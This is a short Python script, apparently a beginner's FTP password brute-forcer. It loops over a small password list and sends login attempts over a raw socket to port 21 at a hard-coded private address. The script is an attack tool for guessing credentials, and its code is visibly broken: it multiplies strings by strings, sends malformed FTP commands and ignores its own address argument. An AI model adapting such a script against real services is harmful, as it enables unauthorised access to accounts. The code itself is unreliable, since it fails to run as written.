import socket
import re
import sys

def connection(ip,user,passw):
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print('Trying'+ ip + ':' + user + ':'+ passw)
    sock.connect(('192.168.0.1',21))
    data=sock.recv(1024)
    sock.send('User' + user * '\r\n')
    data=sock.recv(1024)
    sock.send('Password' + passw * '\r\n')
    data=sock.recv(1024)
    sock.send('Quit'*'\r\n')
    sock.close()
    
    return data

if __name__=='__main__':
        
    user = 'User1'
    password=['pass1','passw2','pass3']

    for passww in password:
        print(connection('192.168.0.1',user,passww))
        